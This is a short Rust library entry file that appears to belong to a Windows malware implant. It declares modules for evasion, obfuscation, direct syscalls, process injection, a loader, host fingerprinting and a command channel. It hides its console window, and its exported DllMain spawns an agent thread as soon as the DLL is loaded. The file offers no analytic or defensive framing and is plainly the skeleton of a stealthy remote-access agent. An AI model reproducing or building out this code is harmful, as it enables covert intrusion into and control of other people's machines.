#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod channel;
mod crypto;
mod evasion;
mod executor;
mod obfs;
mod task;
mod syscall;
mod inject;
mod loader;
mod fingerprint;
mod agent_loop;

pub use agent_loop::Session;

// DLL_PROCESS_ATTACH = 1
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hmodule: isize,
    reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    if reason == 1 {
        unsafe {
            windows_sys::Win32::System::Threading::CreateThread(
                core::ptr::null_mut(),
                0,
                Some(agent_thread),
                core::ptr::null_mut(),
                0,
                core::ptr::null_mut(),
            );
        }
    }
    1
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn agent_thread(_: *mut core::ffi::c_void) -> u32 {
    agent_loop::run();
    0
}
